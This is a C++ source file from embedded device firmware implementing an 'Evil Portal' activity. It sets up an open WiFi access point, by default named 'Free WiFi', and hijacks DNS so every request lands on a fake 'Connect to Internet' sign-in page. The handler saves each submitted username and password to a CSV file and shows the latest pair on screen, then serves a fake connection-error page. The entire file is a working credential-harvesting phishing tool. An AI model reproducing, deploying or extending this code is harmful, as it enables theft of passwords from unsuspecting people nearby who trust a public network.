#include "CaptivePortalActivity.h"
#include "../Shelf.h"
#include "../util/RadioManager.h"
#include "DevMode.h"
#include "MappedInputManager.h"
#include "activities/util/KeyboardEntryActivity.h"
#include "components/UITheme.h"
#include "fontIds.h"

#include <HalStorage.h>
#include <Logging.h>
#include <WiFi.h>

#include <cstdio>
#include <string>

static const char BUILTIN_HTML[] = R"rawhtml(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title><style>
*{box-sizing:border-box}body{font-family:-apple-system,Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.c{background:#fff;padding:32px;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,0,.1);width:90%;max-width:400px}
h2{margin:0 0 8px;color:#1a1a1a}p{color:#666;margin:0 0 24px;font-size:14px}
input{width:100%;padding:14px;margin:0 0 12px;border:1px solid #ddd;border-radius:8px;font-size:16px}
button{width:100%;padding:14px;background:#4285f4;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
</style></head><body><div class="c"><h2>Connect to Internet</h2>
<p>Sign in to access the network</p>
<form method="POST" action="/login">
<input name="username" placeholder="Email or username" required autocomplete="off">
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign In</button></form></div></body></html>)rawhtml";

static const char RESPONSE_HTML[] =
    "<html><body><h2>Connection Error</h2><p>Unable to connect. Please try again later.</p></body></html>";

static constexpr const char* BUILTIN_NAME = "(Built-in) WiFi Login";

void CaptivePortalActivity::onEnter() {
  devmode::pause();
  Activity::onEnter();
  RADIO.ensureWifi();
  state = SELECT_TEMPLATE;
  templates.clear();
  selectorIndex = 0;
  capturedCount = 0;
  lastUsername.clear();
  lastPassword.clear();
  Storage.mkdir("/crossplay/portals");
  loadTemplates();
  requestUpdate();
}

void CaptivePortalActivity::onExit() {
  stopPortal();
  RADIO.shutdown();
  devmode::resume();
  Activity::onExit();
}

void CaptivePortalActivity::loadTemplates() {
  templates.clear();
  templates.push_back(BUILTIN_NAME);

  auto dir = Storage.open("/crossplay/portals");
  if (!dir || !dir.isDirectory()) return;

  char name[128];
  for (auto entry = dir.openNextFile(); entry; entry = dir.openNextFile()) {
    if (!entry.isDirectory()) {
      entry.getName(name, sizeof(name));
      std::string fname(name);
      if (fname.size() > 5 && fname.substr(fname.size() - 5) == ".html")
        templates.push_back(fname);
    }
  }
}

void CaptivePortalActivity::startPortal() {
  stopPortal();
  WiFi.mode(WIFI_AP);
  WiFi.softAP(apSsid.c_str());
  delay(100);

  dnsServer = makeUniqueNoThrow<DNSServer>();
  webServer  = makeUniqueNoThrow<WebServer>(80);
  if (!dnsServer || !webServer) {
    LOG_ERR("PORTAL", "OOM: server alloc failed");
    state = STOPPED;
    requestUpdate();
    return;
  }

  dnsServer->start(53, "*", WiFi.softAPIP());
  webServer->on("/", HTTP_GET,   [this] { handleRoot(); });
  webServer->on("/login", HTTP_POST, [this] { handleLogin(); });
  webServer->onNotFound([this] { handleNotFound(); });
  webServer->begin();

  capturedCount = 0;
  lastUsername.clear();
  lastPassword.clear();
  state = RUNNING;
  LOG_INF("PORTAL", "Evil Portal active: %s", apSsid.c_str());
  requestUpdate();
}

void CaptivePortalActivity::stopPortal() {
  if (webServer) { webServer->stop(); webServer.reset(); }
  if (dnsServer) { dnsServer->stop(); dnsServer.reset(); }
  WiFi.softAPdisconnect(true);
}

void CaptivePortalActivity::handleRoot() {
  if (!webServer) return;

  if (selectedTemplate == BUILTIN_NAME) {
    webServer->send(200, "text/html", BUILTIN_HTML);
    return;
  }

  const std::string path = "/crossplay/portals/" + selectedTemplate;
  HalFile file;
  if (!Storage.openFileForRead("PORTAL", path.c_str(), file)) {
    webServer->send(200, "text/html", BUILTIN_HTML);
    return;
  }

  webServer->setContentLength(file.size());
  webServer->send(200, "text/html", "");
  uint8_t buf[512];
  while (file.available()) {
    const int n = file.read(buf, sizeof(buf));
    if (n <= 0) break;
    webServer->sendContent(reinterpret_cast<const char*>(buf), n);
  }
}

void CaptivePortalActivity::handleLogin() {
  if (!webServer) return;
  const std::string username = webServer->arg("username").c_str();
  const std::string password = webServer->arg("password").c_str();
  if (!username.empty()) {
    logCredentials(username, password);
    capturedCount++;
    lastUsername = username;
    lastPassword = password;
    requestUpdate();
  }
  webServer->send(200, "text/html", RESPONSE_HTML);
}

void CaptivePortalActivity::handleNotFound() {
  if (!webServer) return;
  webServer->sendHeader("Location", "http://192.168.4.1/", true);
  webServer->send(302, "text/plain", "");
}

void CaptivePortalActivity::logCredentials(const std::string& username, const std::string& password) {
  const char* logPath = "/crossplay/creds.csv";
  const bool exists = Storage.exists(logPath);
  HalFile file;
  if (!Storage.openFileForAppend("PORTAL", logPath, file)) return;
  if (!exists) file.println("timestamp,ssid,username,password");
  char line[256];
  snprintf(line, sizeof(line), "%lu,%s,%s,%s",
           (unsigned long)millis(), apSsid.c_str(), username.c_str(), password.c_str());
  file.println(line);
  LOG_INF("PORTAL", "Captured: %s / %s", username.c_str(), password.c_str());
}

void CaptivePortalActivity::loop() {
  if (state == RUNNING) {
    if (dnsServer) dnsServer->processNextRequest();
    if (webServer) webServer->handleClient();

    int x = 0, y = 0;
    const bool touch = mappedInput.wasScreenTapped(x, y);
    const int hint = touch ? GUI.tappedAlwaysHintButton(x, y, renderer) : 0;
    if (mappedInput.wasReleased(MappedInputManager::Button::Back) || hint == 1) {
      stopPortal();
      state = STOPPED;
      requestUpdate();
    }
    return;
  }

  if (state == STOPPED) {
    int x = 0, y = 0;
    const bool touch = mappedInput.wasScreenTapped(x, y);
    const int hint = touch ? GUI.tappedAlwaysHintButton(x, y, renderer) : 0;
    if (mappedInput.wasReleased(MappedInputManager::Button::Back) || hint == 1) {
      shelf::leave(renderer, mappedInput);
    }
    if (mappedInput.wasReleased(MappedInputManager::Button::Confirm) || hint == 2) {
      state = SELECT_TEMPLATE;
      requestUpdate();
    }
    return;
  }

  if (state == ENTER_SSID) return;

  // SELECT_TEMPLATE
  const int count = static_cast<int>(templates.size());
  buttonNavigator.onNext([this, count] {
    if (count > 0) { selectorIndex = ButtonNavigator::nextIndex(selectorIndex, count); requestUpdate(); }
  });
  buttonNavigator.onPrevious([this, count] {
    if (count > 0) { selectorIndex = ButtonNavigator::previousIndex(selectorIndex, count); requestUpdate(); }
  });

  if (mappedInput.wasReleased(MappedInputManager::Button::Back)) {
    shelf::leave(renderer, mappedInput);
    return;
  }
  if (mappedInput.wasReleased(MappedInputManager::Button::Confirm) && !templates.empty()) {
    selectedTemplate = templates[selectorIndex];
    state = ENTER_SSID;
    startActivityForResult(
        makeUniqueNoThrow<KeyboardEntryActivity>(renderer, mappedInput, "AP Name", "Free WiFi", 32),
        [this](const ActivityResult& result) {
          if (result.isCancelled) { state = SELECT_TEMPLATE; requestUpdate(); return; }
          apSsid = std::get<KeyboardResult>(result.data).text;
          if (apSsid.empty()) apSsid = "Free WiFi";
          startPortal();
        });
    return;
  }

  int x = 0, y = 0;
  if (!mappedInput.wasScreenTapped(x, y)) return;
  const int hint = GUI.tappedAlwaysHintButton(x, y, renderer);
  if (hint == 1) { shelf::leave(renderer, mappedInput); return; }
  if (hint == 2 && !templates.empty()) {
    selectedTemplate = templates[selectorIndex];
    state = ENTER_SSID;
    startActivityForResult(
        makeUniqueNoThrow<KeyboardEntryActivity>(renderer, mappedInput, "AP Name", "Free WiFi", 32),
        [this](const ActivityResult& result) {
          if (result.isCancelled) { state = SELECT_TEMPLATE; requestUpdate(); return; }
          apSsid = std::get<KeyboardResult>(result.data).text;
          if (apSsid.empty()) apSsid = "Free WiFi";
          startPortal();
        });
    return;
  }
  if (hint == 3) {
    if (count > 0) { selectorIndex = ButtonNavigator::previousIndex(selectorIndex, count); requestUpdate(); }
    return;
  }
  if (hint == 4) {
    if (count > 0) { selectorIndex = ButtonNavigator::nextIndex(selectorIndex, count); requestUpdate(); }
    return;
  }

  const auto& m = UITheme::getInstance().getMetrics();
  const int top = m.topPadding + m.headerHeight + m.verticalSpacing;
  const int contentH = renderer.getScreenHeight() - top - BaseMetrics::values.buttonHintsHeight - m.verticalSpacing;
  const int rowStep = GUI.getListRowStep(false);
  if (rowStep > 0 && y >= top && y < top + contentH && count > 0) {
    const int row = (y - top) / rowStep;
    if (row >= 0 && row < count) {
      selectorIndex = row;
      requestUpdate();
    }
  }
}

void CaptivePortalActivity::render(RenderLock&&) {
  const auto& m = UITheme::getInstance().getMetrics();
  const int w = renderer.getScreenWidth();
  const int h = renderer.getScreenHeight();
  renderer.clearScreen();
  GUI.drawHeader(renderer, Rect{0, m.topPadding, w, m.headerHeight}, "Evil Portal");

  if (state == RUNNING || state == STOPPED) {
    const int left = m.contentSidePadding;
    int y = m.topPadding + m.headerHeight + 30;
    constexpr int lineH = 45;

    renderer.drawText(SMALL_FONT_ID, left, y,
                      state == RUNNING ? "ACTIVE" : "Stopped", true, EpdFontFamily::BOLD);
    y += lineH;
    renderer.drawText(SMALL_FONT_ID, left, y, "SSID:", true, EpdFontFamily::BOLD);
    renderer.drawText(UI_10_FONT_ID, left + 60, y, apSsid.c_str());
    y += lineH;

    char buf[64];
    snprintf(buf, sizeof(buf), "Clients: %d", WiFi.softAPgetStationNum());
    renderer.drawText(UI_10_FONT_ID, left, y, buf);
    y += lineH;

    snprintf(buf, sizeof(buf), "Captured: %d", capturedCount);
    renderer.drawText(UI_10_FONT_ID, left, y, buf, true, EpdFontFamily::BOLD);
    y += lineH;

    if (!lastUsername.empty()) {
      snprintf(buf, sizeof(buf), "User: %s", lastUsername.c_str());
      renderer.drawText(UI_10_FONT_ID, left, y, buf);
      y += lineH;
      snprintf(buf, sizeof(buf), "Pass: %s", lastPassword.c_str());
      renderer.drawText(UI_10_FONT_ID, left, y, buf);
    }

    const auto labels = mappedInput.mapLabels("Stop", "", "", "");
    GUI.drawButtonHintsAlways(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  } else if (state == SELECT_TEMPLATE) {
    const int top = m.topPadding + m.headerHeight + m.verticalSpacing;
    const int bottom = h - BaseMetrics::values.buttonHintsHeight - m.verticalSpacing;
    GUI.drawList(renderer,
                 Rect{0, top, w, bottom - top},
                 static_cast<int>(templates.size()), selectorIndex,
                 [this](int i) -> std::string { return templates[i]; });
    const auto labels = mappedInput.mapLabels("Back", "Select", "^", "v");
    GUI.drawButtonHintsAlways(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  } else {
    renderer.drawCenteredText(UI_10_FONT_ID, h / 2, "Enter AP name...");
  }

  renderer.displayBuffer();
}
